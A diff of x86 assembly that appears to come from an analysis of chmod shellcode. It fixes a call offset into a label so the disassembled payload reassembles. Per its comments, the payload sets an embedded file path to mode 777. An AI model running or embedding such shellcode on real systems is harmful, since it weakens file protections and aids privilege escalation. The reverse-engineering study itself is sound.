@@ -14,7 +14,7 @@ _start:
 	push byte 0xf			; 0xf = 15 = chmod()
 	pop eax				; prepare eax for chmod() syscall
 	push edx
-	call dword 0x1f		; call shellcode+31
+	call next		; call shellcode+31
 
 	; below is a string misinterpreted as assembly by nasm
 	das
@@ -45,6 +45,7 @@ _start:
 	; thanks to gdb and edb debugguers, we know the correct code, see below (2 lines)
 	; 00 end of above string
 	; above call shellcode+31 jumps below
+next:
 	pop ebx				; \x5B -> 1st arg: store *path in ebx (file to chmod)
 	push 0x01ff			; \x68\xFF\x01\x00\x00 -> 0x1ff = 777 octal (file's permissions)
 
